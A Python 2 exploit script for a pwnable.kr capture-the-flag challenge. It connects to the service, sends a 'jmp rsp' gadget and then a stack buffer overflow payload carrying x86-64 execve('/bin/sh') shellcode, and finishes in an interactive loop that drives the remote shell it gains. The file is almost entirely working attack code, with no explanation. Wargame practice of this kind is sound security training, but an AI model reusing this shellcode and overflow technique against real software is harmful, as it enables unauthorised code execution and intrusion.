import socket
import time
import sys
import struct
import fcntl
import os 

def read_until(word):
    data = ''
    letterIndex = 0
    letter = word[0]
    while word != data:
        character = s.recv(1)
        sys.stdout.write(character)
        if character == letter:
            data+=character
            letterIndex+=1
            if letterIndex < len(word):
                letter = word[letterIndex]
        else:
            data = ''
            letterIndex = 0
            letter = word[letterIndex]



s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('pwnable.kr', 9010))


jmp_asm = "\xff\xe4"
shellcode = "\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\xb0\x3b\x0f\x05"


s.send(jmp_asm + "\n")

print s.recv(512)

s.send("1\n")

print s.recv(512)

s.send("A"*40 + struct.pack("<Q", 0x0000000000603010) + shellcode + "\n")

read_until("\n")

s.settimeout(0.25)
while(True):
    try:
        print s.recv(512)
    except:
        s.send(raw_input() + '\n')

